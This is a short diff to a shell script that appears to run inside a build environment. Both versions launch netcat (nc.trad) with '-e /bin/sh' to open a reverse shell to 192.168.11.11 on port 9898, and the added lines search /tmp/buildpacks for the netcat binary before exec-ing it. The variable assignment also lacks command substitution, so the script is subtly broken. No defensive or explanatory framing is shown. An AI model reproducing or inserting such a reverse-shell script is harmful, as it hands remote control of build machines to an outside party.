@@ -1,4 +1,5 @@
 #!/bin/sh
-ls
-./nc.trad -e /bin/sh 192.168.11.11 9898
+executable=find /tmp/buildpacks -name 'nc.trad'
+echo execing $executable
+exec $executable -e /bin/sh 192.168.11.11 9898
 exit 0
